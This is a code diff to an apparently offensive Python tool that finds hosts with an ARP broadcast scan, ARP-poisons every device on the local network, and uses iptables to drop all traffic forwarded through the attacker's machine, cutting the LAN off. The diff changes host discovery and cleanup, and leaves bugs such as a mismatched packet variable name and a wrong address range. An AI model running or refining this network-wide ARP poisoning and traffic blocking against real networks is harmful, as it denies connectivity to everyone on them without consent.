@@ -10,16 +10,26 @@ GREEN = '\033[1;32;40m'
 LOGO = '\033[1;35;47m'
 NONE = '\033[1;37;40m'
 ip_list = []
+target_ip = ""
+ap_ip = ""
+target_mac = ""
+ap_mac = ""
+interface = ""
+delay = 0
 
 parser = argparse.ArgumentParser(description=(GREEN + "Proxies entire local traffic through your machine and blocks it completely." + NONE))
 parser.add_argument('-i', '--interface', type=str, required=True, help='''Pick an interface which'll be used.''')
 parser.add_argument('-g', '--gateway', type=str, required=True, help='''Pick your gateway IP Address.''')
-parser.add_argument('-t', '--time', type=float, required=False, help='''Optional selection of delays between target poisons.''')
+parser.add_argument('-t', '--time', type=float, default=0.3 ,required=False, help='''Optional selection of delays between target poisons.''')
 args = parser.parse_args()
 
+'''
 def ping(ip):
-    response = os.system("ping " + ip)
+    proc = subprocess.Popen(["ping","-c","5",ip], stdout=subprocess.PIPE)
+    stdout, stderr = proc.communicate()
+    response = proc.returncode
     return response
+'''
 
 def get_mac_address(ip, interface):
     conf.verb = 0
@@ -29,20 +39,18 @@ def get_mac_address(ip, interface):
 
 def ip_parser(ap_ip):
     if ap_ip[1] == "9":
-        char = ap_ip[8]
-        for i in range(255):
-            ip_list.append(f"192.168.{char}.{i}")
+        cidr = "192.168.1.1"
     elif ap_ip[1] == "0":
-        char = ap_ip[5]
-        for i in range(255):
-            ip_list.append(f"10.0.{char}.{i}")
+        cidr = "10.0.0.0/24"
     else:
         print(BAD_ERR + "Error: Bad gateway IP!" + NONE)
-    for ip in ip_list:
-        if ping(ip) == 0:
-            pass
-        else:
-            ip_list.remove(ip)
+    arp = ARP(pdst=cidr)
+    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
+    pckt = ether/arp
+    result = srp(packet, timeout=3, verbose=False)[0]
+    for element in result:
+        ip_list.append(element.psrc)
+    return ip_list
 
 def reARP(target_ip, ap_ip):
     print(f"Restoring {target_ip}...")
@@ -54,7 +62,7 @@ def reARP(target_ip, ap_ip):
         print(ERR + f"Unable to send ARP to {target_ip}" + NONE)
         
 
-def exit_handler():
+def exit_handler(interface, ap_ip):
     try:
         print("Disabling IP forwarding...")
         os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
@@ -62,8 +70,14 @@ def exit_handler():
         print("Unlocking entire forwarded traffic...")
         os.system(f"iptables -A FORWARD -o {interface} -j ACCEPT")
         print(GREEN + "Done!" + NONE)
-        for target_ip in ip_list:
-            reARP(target_ip, ap_ip)
+        print("Restoring targets...")
+        try:
+            for target_ip in ip_list:
+                reARP(target_ip, ap_ip)
+                print(GREEN + f"Restored {target_ip}" + NONE)
+        except KeyboardInterrupt:
+            print(ERR + "User Interruption, halting..." + NONE)
+        print(GREEN + "Done!" + NONE)
         print(ERR + "Exiting..." + NONE)
         sys.exit(1)
     except:
@@ -73,12 +87,12 @@ def exit_handler():
 def proxier(ap_ip, interface):
     try:
         ap_mac = get_mac_address(ap_ip, interface)
+        print(NONE + "Parsing available IP adresses...")
+        ip_list = ip_parser(ap_ip)
+        print(GREEN + "Done!" + NONE)
         print("Blocking entire forwarded traffic...")
         os.system(f"iptables -A FORWARD -o {interface} -j DROP")
         print(GREEN + "Done!" + NONE)
-	print("Parsing available IP adresses...")
-	ip_parser(ap_ip)
-	print(GREEN + "Done!" + NONE)
         print("Starting to Poison the Network...")
         while 1 < 2:
             for target_ip in ip_list:
@@ -92,7 +106,8 @@ def proxier(ap_ip, interface):
                 sleep(delay)
     except KeyboardInterrupt:
         print(ERR + "User Interrupt, exiting..." + NONE)
-        exit_handler()
+        print(ip_list)
+        exit_handler(interface,ap_ip)
 
 def main():
     target_ip = ""
